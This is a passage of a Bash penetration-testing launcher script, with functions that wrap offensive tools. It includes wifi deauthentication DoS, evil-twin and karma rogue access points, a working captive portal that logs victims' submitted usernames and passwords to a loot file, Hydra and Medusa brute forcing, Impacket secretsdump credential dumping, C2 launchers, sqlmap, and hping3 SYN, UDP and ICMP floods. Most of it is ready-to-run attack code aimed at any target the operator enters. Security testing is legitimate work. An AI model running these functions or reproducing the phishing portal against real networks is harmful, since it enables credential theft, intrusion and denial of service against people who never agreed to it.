    log_command_preview "bettercap -iface \"${IFACE}\" -log \"${log_file}\" -eval ..."
    bettercap -iface "$IFACE" -log "$log_file" -eval "set wifi.recon.channel_hop true; wifi.recon on; set ticker.commands 'wifi.show'; ticker on"
    log_loot "Bettercap log: $log_file"
    operation_summary "Bettercap WiFi" "$start_ms" "$log_file"
}

cmd_fluxion() {
    require_root || return 1
    check_tool "fluxion" || return 1
    operation_header "Fluxion" "rogue"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Launching Fluxion"
    log_command_preview "fluxion"
    fluxion
    operation_summary "Fluxion" "$start_ms" "${LOG_DIR}/fluxion.log"
}

cmd_wifiphisher() {
    require_root || return 1
    check_tool "wifiphisher" || return 1
    get_interface || return 1
    operation_header "Wifiphisher" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Starting Wifiphisher on $IFACE"
    log_command_preview "wifiphisher -i \"${IFACE}\""
    wifiphisher -i "$IFACE"
    operation_summary "Wifiphisher" "$start_ms" "${LOG_DIR}/wifiphisher.log"
}

cmd_mdk_dos() {
    require_root || return 1
    local tool=""
    if command -v mdk4 &>/dev/null; then
        tool="mdk4"
    elif command -v mdk3 &>/dev/null; then
        tool="mdk3"
    else
        log_error "mdk3/mdk4 not found"
        return 1
    fi
    get_interface || return 1
    echo -ne "    ${C_GHOST}Target BSSID (or 'broadcast'): ${C_RESET}"
    read -r bssid
    echo -ne "    ${C_GHOST}Channel [1]: ${C_RESET}"
    read -r channel
    channel="${channel:-1}"
    mkdir -p "$TMP_DIR"
    local bssid_list="${TMP_DIR}/mdk_bssids.txt"
    echo "$bssid" > "$bssid_list"
    operation_header "${tool^^} DoS" "$bssid"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "${tool^^} DoS on $bssid channel $channel"
    if [[ "$tool" == "mdk4" ]]; then
        log_command_preview "mdk4 \"${IFACE}\" d -B \"${bssid}\" -c \"${channel}\""
        mdk4 "$IFACE" d -B "$bssid" -c "$channel"
    else
        log_command_preview "mdk3 \"${IFACE}\" d -b \"${bssid_list}\" -c \"${channel}\""
        mdk3 "$IFACE" d -b "$bssid_list" -c "$channel"
    fi
    operation_summary "${tool^^} DoS" "$start_ms" "${LOG_DIR}/mdk.log"
}

cmd_evil_twin_scan() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1
    operation_header "Evil twin scan" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Scanning for APs to clone on $IFACE"
    log_command_preview "airodump-ng \"${IFACE}\""
    airodump-ng "$IFACE"
    operation_summary "Evil twin scan" "$start_ms" "${LOG_DIR}/evil_scan.log"
}

cmd_evil_twin_create() {
    require_root || return 1
    check_tool "hostapd" || return 1
    check_tool "dnsmasq" || return 1
    check_tool "iptables" || return 1
    get_interface || return 1
    mkdir -p "$TMP_DIR" "$LOOT_DIR"

    echo -ne "    ${C_GHOST}Target SSID: ${C_RESET}"
    # shellcheck disable=SC2034
    read -r TARGET_SSID
    echo -ne "    ${C_GHOST}Target channel: ${C_RESET}"
    # shellcheck disable=SC2034
    read -r CHANNEL
    echo -ne "    ${C_GHOST}Target BSSID (for reference): ${C_RESET}"
    read -r TARGET_BSSID
    echo -ne "    ${C_GHOST}Uplink interface for NAT (blank=none): ${C_RESET}"
    read -r UPLINK

    echo "$IFACE" > "${TMP_DIR}/evil_iface.txt"
    local hostapd_conf="${TMP_DIR}/hostapd_${IFACE}.conf"
    local dnsmasq_conf="${TMP_DIR}/dnsmasq_${IFACE}.conf"
    eval "cat <<EOF > \"$hostapd_conf\"\n${HOSTAPD_TEMPLATE}\nEOF"
    eval "cat <<EOF > \"$dnsmasq_conf\"\n${DNSMASQ_TEMPLATE}\nEOF"

    ip link set "$IFACE" down
    ip addr flush dev "$IFACE"
    ip addr add 192.168.1.1/24 dev "$IFACE"
    ip link set "$IFACE" up

    local dns_pid_file="${TMP_DIR}/dnsmasq_${IFACE}.pid"
    local ap_log
    ap_log="${LOOT_DIR}/evil_twin_clients_$(date +%Y%m%d_%H%M%S).log"
    local hostapd_pid_file="${TMP_DIR}/hostapd_${IFACE}.pid"
    local start_ms
    start_ms=$(start_timer_ms)
    dnsmasq -C "$dnsmasq_conf" --pid-file="$dns_pid_file"
    hostapd -B -P "$hostapd_pid_file" -f "$ap_log" "$hostapd_conf"

    if [[ -n "$UPLINK" ]]; then
        echo "$UPLINK" > "${TMP_DIR}/evil_uplink.txt"
        iptables -t nat -A POSTROUTING -o "$UPLINK" -j MASQUERADE
        iptables -A FORWARD -i "$UPLINK" -o "$IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
        iptables -A FORWARD -i "$IFACE" -o "$UPLINK" -j ACCEPT
    fi

    log_loot "Evil twin running on $IFACE (log: $ap_log)"
    [[ -n "$TARGET_BSSID" ]] && log_info "Cloning BSSID: $TARGET_BSSID"
    operation_summary "Evil twin" "$start_ms" "$ap_log"
}

cmd_captive_portal() {
    require_root || return 1
    mkdir -p "$TMP_DIR" "$LOOT_DIR"
    echo -ne "    ${C_GHOST}Interface to listen on [${IFACE:-wlan0}]: ${C_RESET}"
    read -r portal_iface
    portal_iface="${portal_iface:-${IFACE:-wlan0}}"
    operation_header "Captive portal" "$portal_iface"
    local start_ms
    start_ms=$(start_timer_ms)
    echo "$portal_iface" > "${TMP_DIR}/portal_iface.txt"
    local creds_file
    creds_file="${LOOT_DIR}/creds_$(date +%Y%m%d_%H%M%S).txt"
    local portal_dir="${TMP_DIR}/portal"
    mkdir -p "$portal_dir"
    cat > "${portal_dir}/portal.py" <<PY
import http.server
import urllib.parse
from datetime import datetime

CREDS_FILE = "${creds_file}"

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length).decode()
        data = urllib.parse.parse_qs(body)
        with open(CREDS_FILE, 'a', encoding='utf-8') as fh:
            fh.write(f"[{datetime.utcnow().isoformat()}] {data}\n")
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

if __name__ == '__main__':
    http.server.test(HandlerClass=Handler, port=8080, bind='0.0.0.0')
PY

    cat > "${portal_dir}/index.html" <<'HTML'
<html><head><title>Login</title></head><body><h3>Network Login</h3><form method="POST"><input name="user" placeholder="Username"/><br/><input name="pass" placeholder="Password" type="password"/><br/><button type="submit">Login</button></form></body></html>
HTML

    local portal_pid_file="${TMP_DIR}/portal.pid"
    (cd "$portal_dir" && python3 portal.py >/dev/null 2>&1 & echo $! > "$portal_pid_file")
    iptables -t nat -A PREROUTING -i "$portal_iface" -p tcp --dport 80 -j REDIRECT --to-port 8080
    log_loot "Captive portal running on $portal_iface (creds -> $creds_file)"
    operation_summary "Captive portal" "$start_ms" "$creds_file"
}

cmd_karma_attack() {
    require_root || return 1
    get_interface || return 1
    mkdir -p "$TMP_DIR"
    local karma_pid_file="${TMP_DIR}/karma_${IFACE}.pid"
    if check_tool "hostapd-mana" 2>/dev/null; then
        operation_header "hostapd-mana" "$IFACE"
        local start_ms
        start_ms=$(start_timer_ms)
        log_attack "Starting hostapd-mana karma on $IFACE"
        log_command_preview "hostapd-mana -i \"${IFACE}\" -m"
        hostapd-mana -i "$IFACE" -m >> "${LOG_DIR}/karma.log" 2>&1 & echo $! > "$karma_pid_file"
        operation_summary "hostapd-mana" "$start_ms" "${LOG_DIR}/karma.log"
    elif check_tool "airbase-ng" 2>/dev/null; then
        operation_header "airbase-ng" "$IFACE"
        local start_ms
        start_ms=$(start_timer_ms)
        log_attack "Starting airbase-ng karma on $IFACE"
        log_command_preview "airbase-ng -P -C 30 -v \"${IFACE}\""
        airbase-ng -P -C 30 -v "$IFACE" >> "${LOG_DIR}/karma.log" 2>&1 & echo $! > "$karma_pid_file"
        operation_summary "airbase-ng" "$start_ms" "${LOG_DIR}/karma.log"
    else
        log_error "hostapd-mana or airbase-ng required"
        return 1
    fi
}

cmd_evil_twin_stop() {
    require_root || return 1
    operation_header "Rogue AP stop" "active APs"
    local start_ms
    start_ms=$(start_timer_ms)
    local ap_iface=""
    local portal_iface=""
    [[ -f "${TMP_DIR}/evil_iface.txt" ]] && ap_iface="$(cat "${TMP_DIR}/evil_iface.txt")"
    [[ -f "${TMP_DIR}/portal_iface.txt" ]] && portal_iface="$(cat "${TMP_DIR}/portal_iface.txt")"
    for pid_file in "$TMP_DIR"/hostapd_*.pid "$TMP_DIR"/dnsmasq_*.pid "$TMP_DIR"/portal.pid "$TMP_DIR"/karma_*.pid; do
        [[ -f "$pid_file" ]] || continue
        local pid
        pid=$(cat "$pid_file")
        kill "$pid" 2>/dev/null || true
        rm -f "$pid_file"
    done
    if [[ -f "$TMP_DIR/evil_uplink.txt" ]]; then
        local uplink
        uplink=$(cat "$TMP_DIR/evil_uplink.txt")
        iptables -t nat -D POSTROUTING -o "$uplink" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -i "$uplink" -o "${ap_iface:-$IFACE}" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
        iptables -D FORWARD -i "${ap_iface:-$IFACE}" -o "$uplink" -j ACCEPT 2>/dev/null || true
        rm -f "$TMP_DIR/evil_uplink.txt"
    fi
    if [[ -n "$portal_iface" ]]; then
        iptables -t nat -D PREROUTING -i "$portal_iface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    else
        iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    fi
    rm -f "${TMP_DIR}/evil_iface.txt" "${TMP_DIR}/portal_iface.txt"
    operation_summary "Rogue AP stop" "$start_ms" "${LOG_DIR}/evil_twin_stop.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - CREDENTIALS & BRUTE FORCE
#═══════════════════════════════════════════════════════════════════════════════

cmd_hydra_bruteforce() {
    check_tool "hydra" || return 1
    get_target || return 1
    echo -ne "    ${C_GHOST}Service (ssh/ftp/http-form-post/etc): ${C_RESET}"
    read -r service
    [[ -z "$service" ]] && { log_error "Service required"; return 1; }
    echo -ne "    ${C_GHOST}Username (leave blank to use user list): ${C_RESET}"
    read -r user
    echo -ne "    ${C_GHOST}User list (optional): ${C_RESET}"
    read -r userlist
    echo -ne "    ${C_GHOST}Password list [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r passlist
    passlist="${passlist:-/usr/share/wordlists/rockyou.txt}"

    # Ensure rockyou.txt is available if using default wordlist
    if [[ "$passlist" == "/usr/share/wordlists/rockyou.txt" ]]; then
        ensure_rockyou || return 1
    fi

    echo -ne "    ${C_GHOST}Port (optional): ${C_RESET}"
    read -r port

    [[ -z "$user" && -z "$userlist" ]] && { log_error "Provide a username or user list"; return 1; }

    local args=()
    if [[ -n "$userlist" ]]; then
        args+=("-L" "$userlist")
    else
        args+=("-l" "$user")
    fi
    args+=("-P" "$passlist")
    [[ -n "$port" ]] && args+=("-s" "$port")
    args+=("$TARGET" "$service")
    operation_header "Hydra" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Hydra attack on $TARGET ($service)"
    log_command_preview "hydra ${args[*]} -o ${OUTPUT_FILE}_hydra.txt"
    hydra "${args[@]}" -o "${OUTPUT_FILE}_hydra.txt" | tee -a "${LOG_DIR}/hydra.log"
    log_loot "Results saved: ${OUTPUT_FILE}_hydra.txt"
    operation_summary "Hydra" "$start_ms" "${OUTPUT_FILE}_hydra.txt"
}

cmd_medusa_bruteforce() {
    check_tool "medusa" || return 1
    get_target || return 1
    echo -ne "    ${C_GHOST}Service (ssh/ftp/smb): ${C_RESET}"
    read -r service
    [[ -z "$service" ]] && { log_error "Service required"; return 1; }
    echo -ne "    ${C_GHOST}User list: ${C_RESET}"
    read -r userlist
    [[ -z "$userlist" ]] && { log_error "User list required"; return 1; }
    echo -ne "    ${C_GHOST}Password list [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r passlist
    passlist="${passlist:-/usr/share/wordlists/rockyou.txt}"

    # Ensure rockyou.txt is available if using default wordlist
    if [[ "$passlist" == "/usr/share/wordlists/rockyou.txt" ]]; then
        ensure_rockyou || return 1
    fi

    echo -ne "    ${C_GHOST}Port (optional): ${C_RESET}"
    read -r port

    local args=("-h" "$TARGET" "-U" "$userlist" "-P" "$passlist" "-M" "$service")
    [[ -n "$port" ]] && args+=("-n" "$port")
    operation_header "Medusa" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Medusa attack on $TARGET ($service)"
    log_command_preview "medusa ${args[*]}"
    medusa "${args[@]}" | tee -a "${LOG_DIR}/medusa.log"
    operation_summary "Medusa" "$start_ms" "${LOG_DIR}/medusa.log"
}

cmd_crackmapexec() {
    check_tool "crackmapexec" || return 1
    get_target || return 1
    echo -ne "    ${C_GHOST}Protocol [smb/ssh/winrm]: ${C_RESET}"
    read -r protocol
    protocol="${protocol:-smb}"
    echo -ne "    ${C_GHOST}Username: ${C_RESET}"
    read -r user
    echo -ne "    ${C_GHOST}Password (or hash): ${C_RESET}"
    read -r pass

    local args=("$protocol" "$TARGET")
    [[ -n "$user" ]] && args+=("-u" "$user")
    [[ -n "$pass" ]] && args+=("-p" "$pass")
    args+=("--shares")
    operation_header "CrackMapExec" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "CrackMapExec on $TARGET ($protocol)"
    log_command_preview "crackmapexec ${args[*]}"
    crackmapexec "${args[@]}" | tee -a "${LOG_DIR}/cme.log"
    operation_summary "CrackMapExec" "$start_ms" "${LOG_DIR}/cme.log"
}

cmd_empire() {
    check_tool "empire" || return 1
    operation_header "Empire" "C2"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Launching Empire C2"
    log_command_preview "empire"
    empire
    operation_summary "Empire" "$start_ms" "${LOG_DIR}/empire.log"
}

cmd_covenant() {
    if command -v covenant &>/dev/null; then
        operation_header "Covenant" "C2"
        local start_ms
        start_ms=$(start_timer_ms)
        log_attack "Launching Covenant"
        log_command_preview "covenant"
        covenant
        operation_summary "Covenant" "$start_ms" "${LOG_DIR}/covenant.log"
    else
        log_error "Covenant launcher not found (expected 'covenant')"
        echo -e "    ${C_SHADOW}Start manually from Covenant directory if installed${C_RESET}"
        return 1
    fi
}

cmd_mimikatz() {
    local secrets_cmd="python3 -m impacket.examples.secretsdump"
    if command -v impacket-secretsdump &>/dev/null; then
        secrets_cmd="impacket-secretsdump"
    fi

    local target_input="${TARGET:-}"
    if [[ -z "$target_input" ]]; then
        target_input=$(get_target_input "Enter target IP/hostname")
    fi
    target_input=$(sanitize_target "$target_input")

    local validated_target
    validated_target=$(validate_target_for_tool "$target_input" "secretsdump") || return 1
    TARGET="$validated_target"

    local domain
    domain=$(get_input "Domain" "WORKGROUP")
    local user
    user=$(get_input "Username" "Administrator")
    local secret
    secret=$(get_password_input "Password/NTLM hash")

    operation_header "Impacket secretsdump" "$TARGET"
    start_timer_ms

    local safe_target
    safe_target=$(sanitize_filename "$TARGET")
    local out_file="${LOOT_DIR}/secrets_${safe_target}_$(date +%Y%m%d_%H%M%S).txt"

    log_command_preview "$secrets_cmd ${domain}/${user}@${TARGET}"

    if $secrets_cmd "${domain}/${user}:${secret}@${TARGET}" 2>&1 | tee "$out_file"; then
        local duration
        duration=$(end_timer_ms)
        log_loot "Dump saved: $out_file"
        operation_summary "success" "Secrets dumped" "Output: $out_file\nDuration: $duration"
    else
        operation_summary "failed" "secretsdump failed"
        return 1
    fi
}

cmd_impacket_scripts() {
    echo -ne "    ${C_GHOST}Impacket script (wmiexec.py/psexec.py/etc): ${C_RESET}"
    read -r script
    [[ -z "$script" ]] && { log_error "Script required"; return 1; }
    echo -ne "    ${C_GHOST}Arguments (e.g., DOMAIN/user:pass@target): ${C_RESET}"
    read -r args
    local script_base="${script%.py}"
    IFS=' ' read -r -a arg_array <<< "$args"
    local start_ms
    start_ms=$(start_timer_ms)
    if command -v "$script" &>/dev/null; then
        operation_header "Impacket" "$script"
        log_attack "Running $script $args"
        $script "${arg_array[@]}" | tee -a "${LOG_DIR}/impacket.log"
    else
        operation_header "Impacket" "$script_base"
        log_attack "Running python impacket.examples.${script_base}"
        python3 -m "impacket.examples.${script_base}" "${arg_array[@]}" | tee -a "${LOG_DIR}/impacket.log"
    fi
    operation_summary "Impacket" "$start_ms" "${LOG_DIR}/impacket.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - WEB
#═══════════════════════════════════════════════════════════════════════════════

run_nikto() {
    check_tool "nikto" || return 1
    operation_header "Nikto" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Nikto scan on $TARGET"
    log_command_preview "nikto -h \"${TARGET}\" -o \"${OUTPUT_FILE}_nikto.txt\""
    nikto -h "$TARGET" -o "${OUTPUT_FILE}_nikto.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_nikto.txt"
    operation_summary "Nikto" "$start_ms" "${OUTPUT_FILE}_nikto.txt"
}

run_wpscan() {
    check_tool "wpscan" || return 1
    operation_header "WPScan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "WordPress scan on $TARGET"
    log_command_preview "wpscan --url \"${TARGET}\" --enumerate u,p,t"
    wpscan --url "$TARGET" --enumerate u,p,t | tee -a "${LOG_DIR}/web.log"
    operation_summary "WPScan" "$start_ms" "${LOG_DIR}/web.log"
}

run_gobuster() {
    check_tool "gobuster" || return 1
    
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    [[ ! -f "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"
    
    operation_header "Gobuster" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Directory brute force on $TARGET"
    log_command_preview "gobuster dir -u \"${TARGET}\" -w \"${wordlist}\" -o \"${OUTPUT_FILE}_gobuster.txt\""
    gobuster dir -u "$TARGET" -w "$wordlist" -o "${OUTPUT_FILE}_gobuster.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_gobuster.txt"
    operation_summary "Gobuster" "$start_ms" "${OUTPUT_FILE}_gobuster.txt"
}

run_ffuf() {
    check_tool "ffuf" || return 1
    
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    echo -ne "    ${C_GHOST}Wordlist [$wordlist]: ${C_RESET}"
    read -r custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"
    
    operation_header "FFUF" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "FFUF fuzzing on $TARGET"
    log_command_preview "ffuf -u ${TARGET}/FUZZ -w ${wordlist} -o ${OUTPUT_FILE}_ffuf.json"
    ffuf -u "${TARGET}/FUZZ" -w "$wordlist" -o "${OUTPUT_FILE}_ffuf.json" | tee -a "${LOG_DIR}/web.log"
    operation_summary "FFUF" "$start_ms" "${OUTPUT_FILE}_ffuf.json"
}

run_nuclei() {
    check_tool "nuclei" || return 1
    operation_header "Nuclei" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Nuclei scan on $TARGET"
    log_command_preview "nuclei -u \"${TARGET}\" -o \"${OUTPUT_FILE}_nuclei.txt\""
    nuclei -u "$TARGET" -o "${OUTPUT_FILE}_nuclei.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_nuclei.txt"
    operation_summary "Nuclei" "$start_ms" "${OUTPUT_FILE}_nuclei.txt"
}

run_httpx() {
    check_tool "httpx" || return 1
    operation_header "httpx" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "httpx probing for $TARGET"
    log_command_preview "echo ${TARGET} | httpx -title -status-code -tech-detect -o ${OUTPUT_FILE}_httpx.txt"
    echo "$TARGET" | httpx -title -status-code -tech-detect -o "${OUTPUT_FILE}_httpx.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_httpx.txt"
    operation_summary "httpx" "$start_ms" "${OUTPUT_FILE}_httpx.txt"
}

run_subfinder() {
    check_tool "subfinder" || return 1
    operation_header "Subfinder" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Subfinder enumeration for $TARGET"
    log_command_preview "subfinder -d \"${TARGET}\" -o \"${OUTPUT_FILE}_subfinder.txt\""
    subfinder -d "$TARGET" -o "${OUTPUT_FILE}_subfinder.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_subfinder.txt"
    operation_summary "Subfinder" "$start_ms" "${OUTPUT_FILE}_subfinder.txt"
}

run_amass() {
    check_tool "amass" || return 1
    operation_header "Amass" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Amass mapping for $TARGET"
    log_command_preview "amass enum -d \"${TARGET}\" -o \"${OUTPUT_FILE}_amass.txt\""
    amass enum -d "$TARGET" -o "${OUTPUT_FILE}_amass.txt" | tee -a "${LOG_DIR}/web.log"
    log_loot "Results saved: ${OUTPUT_FILE}_amass.txt"
    operation_summary "Amass" "$start_ms" "${OUTPUT_FILE}_amass.txt"
}

run_burpsuite() {
    check_tool "burpsuite" || return 1
    operation_header "Burp Suite" "$TARGET"
    log_info "Launching Burp Suite"
    log_command_preview "burpsuite"
    burpsuite &
}

cmd_sqlmap() {
    check_tool "sqlmap" || return 1
    
    echo -ne "    ${C_GHOST}Target URL with parameter (e.g., http://site.com/page?id=1): ${C_RESET}"
    read -r url
    
    [[ -z "$url" ]] && { log_error "URL required"; return 1; }
    
    operation_header "sqlmap" "$url"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "SQL injection on $url"
    log_command_preview "sqlmap -u \"${url}\" --batch --risk=2 --level=3"
    echo
    sqlmap -u "$url" --batch --risk=2 --level=3 | tee -a "${LOG_DIR}/web.log"
    operation_summary "sqlmap" "$start_ms" "${LOG_DIR}/web.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - EXPLOIT
#═══════════════════════════════════════════════════════════════════════════════

cmd_metasploit() {
    check_tool "msfconsole" || return 1
    operation_header "Metasploit" "console"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Launching Metasploit Framework"
    log_command_preview "msfconsole"
    echo
    msfconsole
    operation_summary "Metasploit" "$start_ms" "${LOG_DIR}/metasploit.log"
}

cmd_searchsploit() {
    check_tool "searchsploit" || return 1
    
    echo -ne "    ${C_GHOST}Search term: ${C_RESET}"
    read -r term
    
    [[ -z "$term" ]] && { log_error "Search term required"; return 1; }
    
    operation_header "searchsploit" "$term"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Searching exploits for: $term"
    echo
    log_command_preview "searchsploit ${term}"
    searchsploit "$term"
    operation_summary "searchsploit" "$start_ms" "${LOG_DIR}/searchsploit.log"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - STRESS
#═══════════════════════════════════════════════════════════════════════════════

cmd_iperf3() {
    check_tool "iperf3" || return 1
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} Run as server"
    echo -e "    ${C_GHOST}[2]${C_RESET} Run as client"
    echo
    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
    read -r choice
    
    case "$choice" in
        1)
            operation_header "iperf3" "server"
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Starting iperf3 server"
            log_command_preview "iperf3 -s"
            iperf3 -s
            operation_summary "iperf3 server" "$start_ms" "${LOG_DIR}/iperf3_server.log"
            ;;
        2)
            echo -ne "    ${C_GHOST}Server IP: ${C_RESET}"
            read -r server
            echo -ne "    ${C_GHOST}Duration (seconds, default 10): ${C_RESET}"
            read -r duration
            duration="${duration:-10}"
            
            operation_header "iperf3" "$server"
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Bandwidth test to $server for ${duration}s"
            log_command_preview "iperf3 -c ${server} -t ${duration}"
            iperf3 -c "$server" -t "$duration"
            operation_summary "iperf3 client" "$start_ms" "${LOG_DIR}/iperf3_client.log"
            ;;
    esac
}

cmd_hping3() {
    check_tool "hping3" || return 1
    require_root || return 1

    local target_input="${TARGET:-}"
    if [[ -z "$target_input" ]]; then
        target_input=$(get_target_input "Enter target IP")
    fi
    target_input=$(sanitize_target "$target_input")

    local validated_target
    validated_target=$(validate_target_for_tool "$target_input" "hping3") || return 1
    TARGET="$validated_target"

    local attack_type count rate iface port attack_name

    echo -e "
    ${C_CYAN}[1]${C_RESET} SYN flood      (TCP SYN packets)
    ${C_CYAN}[2]${C_RESET} UDP flood      (UDP packets)
    ${C_CYAN}[3]${C_RESET} ICMP flood     (Ping flood)
    ${C_CYAN}[4]${C_RESET} ACK flood      (TCP ACK packets)
    ${C_CYAN}[5]${C_RESET} Custom         (Define your own)
"
    read -rp "    Select attack type [1]: " attack_type
    attack_type="${attack_type:-1}"

    read -rp "    Packet count [1000]: " count
    count="${count:-1000}"

    read -rp "    Packets per second [0=flood]: " rate
    rate="${rate:-0}"

    read -rp "    Target port [80]: " port
    port="${port:-80}"

    # Interface selection
    echo -e "\n${C_SHADOW}    Available interfaces:${C_RESET}"
    ip -o link show | awk -F': ' '{print "      • " $2}'
    read -rp "    Interface [auto]: " iface

    # Build base command
    local cmd="hping3"

    # Add rate limiting
    if [[ "$rate" != "0" && -n "$rate" ]]; then
        local interval=$((1000000 / rate))
        cmd+=" -i u${interval}"
    else
        cmd+=" --flood"
    fi

    # Add interface
    [[ -n "$iface" ]] && cmd+=" -I $iface"

    # Add attack type flags
    case "$attack_type" in
        1) cmd+=" -S -p $port" ; attack_name="SYN flood" ;;
        2) cmd+=" --udp -p $port" ; attack_name="UDP flood" ;;
        3) cmd+=" --icmp" ; attack_name="ICMP flood" ;;
        4) cmd+=" -A -p $port" ; attack_name="ACK flood" ;;
        5)
            read -rp "    Custom flags: " custom_flags
            cmd+=" $custom_flags"
            attack_name="Custom"
            ;;
        *)
            cmd+=" -S -p $port" ; attack_name="SYN flood"
            ;;
    esac

    # Add packet count
    cmd+=" -c $count"

    # Add target
    cmd+=" $TARGET"

    # Show configuration
    echo -e "
    ${C_CYAN}┌─────────────────────────────────────────────────────────────┐
    │ ⚔  hping3 $attack_name
    │ Target: $TARGET:$port
    │ Packets: $count | Rate: ${rate:-flood}/s
    │ Interface: ${iface:-auto}
    └─────────────────────────────────────────────────────────────┘${C_RESET}
"

    echo -e "    ${C_SHADOW}$ $cmd${C_RESET}"
    echo ""

    # Confirmation
    echo -e "    ${C_RED}[!] This will send $count packets to $TARGET${C_RESET}"
    read -rp "    Continue with attack? [y/N]: " confirm

    if [[ "${confirm,,}" != "y" ]]; then
        echo -e "    ${C_YELLOW}[!] Attack cancelled${C_RESET}"
        return 0
    fi

    log_attack "hping3 $attack_name on $TARGET"
    log_command_preview "$cmd"

    # Run with live output
    local start_time end_time duration
    start_time=$(date +%s)
    eval "$cmd" 2>&1 | while IFS= read -r line; do
        echo -e "    $line"
    done
    end_time=$(date +%s)
    duration=$((end_time - start_time))

    echo -e "
    ${C_GREEN}[✓] Attack complete${C_RESET}
    ${C_SHADOW}Duration: ${duration}s${C_RESET}
"
    press_enter
}

# Alias for compatibility
run_hping_attack() {
    cmd_hping3 "$@"
}

cmd_http_load() {
    check_tool "ab" || { log_warning "ab not found. Install: sudo apt install apache2-utils"; return 1; }
    get_target || return 1
    
    echo -ne "    ${C_GHOST}Concurrent connections (default 10): ${C_RESET}"
    read -r conns
    conns="${conns:-10}"
    
    echo -ne "    ${C_GHOST}Total requests (default 1000): ${C_RESET}"
    read -r reqs
    reqs="${reqs:-1000}"
    
    operation_header "ab" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "HTTP load test on $TARGET ($reqs requests, $conns concurrent)"
    log_command_preview "ab -n ${reqs} -c ${conns} ${TARGET}/"
    echo
    ab -n "$reqs" -c "$conns" "$TARGET/"
    operation_summary "HTTP load" "$start_ms" "${LOG_DIR}/http_load.log"
}

cmd_netem() {
    require_root || return 1
    get_interface || return 1

    # Validate interface
    if ! ip link show "$IFACE" &>/dev/null; then
        echo -e "${C_RED}[!] Interface $IFACE not found${C_RESET}"
        echo -e "${C_SHADOW}    Available interfaces:${C_RESET}"
        ip -o link show | awk -F': ' '{print "      • " $2}'
        return 1
    fi

    # Check netem module
    if ! lsmod | grep -q sch_netem; then
        echo -e "${C_YELLOW}[*] Loading netem kernel module...${C_RESET}"
        if ! modprobe sch_netem 2>/dev/null; then
            echo -e "${C_RED}[!] Failed to load netem module${C_RESET}"
            echo -e "${C_SHADOW}    Try: sudo modprobe sch_netem${C_RESET}"
            return 1
        fi
    fi

    echo -e "
    ${C_CYAN}[1]${C_RESET} Add latency         (delay packets)
    ${C_CYAN}[2]${C_RESET} Add packet loss     (drop % of packets)
    ${C_CYAN}[3]${C_RESET} Add bandwidth limit (throttle speed)
    ${C_CYAN}[4]${C_RESET} Add jitter          (variable delay)
    ${C_CYAN}[5]${C_RESET} Clear all rules     (restore normal)
    ${C_CYAN}[6]${C_RESET} Show current rules
"
    read -rp "    ▶ " action

    case "$action" in
        1)
            read -rp "    Delay in ms [100]: " delay
            delay="${delay:-100}"

            # Clear existing and add new
            tc qdisc del dev "$IFACE" root 2>/dev/null
            if tc qdisc add dev "$IFACE" root netem delay "${delay}ms"; then
                echo -e "${C_GREEN}[✓] Added ${delay}ms latency to $IFACE${C_RESET}"
            else
